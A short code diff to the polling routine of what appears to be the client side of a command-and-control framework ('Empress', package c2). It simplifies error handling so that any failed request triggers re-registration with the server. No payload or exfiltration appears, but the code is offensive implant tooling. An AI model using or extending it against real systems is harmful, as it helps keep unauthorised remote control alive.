@@ -5,14 +5,12 @@ package c2
 import (
 	"bytes"
 	"encoding/json"
-	"errors"
 	"github.com/pygrum/Empress/config"
 	"github.com/pygrum/Empress/transport"
 	log "github.com/sirupsen/logrus"
 	"io"
 	"math/rand"
 	"net/http"
-	"syscall"
 	"time"
 )
 
@@ -71,12 +69,7 @@ func (c *Client) poll() (*transport.Registration, error) {
 	}
 	resp, err := c.HttpClient.Do(req)
 	if err != nil {
-		if errors.Is(err, syscall.ECONNREFUSED) ||
-			errors.Is(err, syscall.ECONNRESET) || errors.Is(err, syscall.ECONNABORTED) {
-			// server cannot be reached (due to firewall or down status), so we may need to register again
-			// using the orphaned response
-			return Registration(c.Response()), err
-		}
+		return Registration(c.Response()), err
 	}
 	log.Infof("sent request: %v, received response: %v", req, resp)
 	if resp.StatusCode != http.StatusOK {
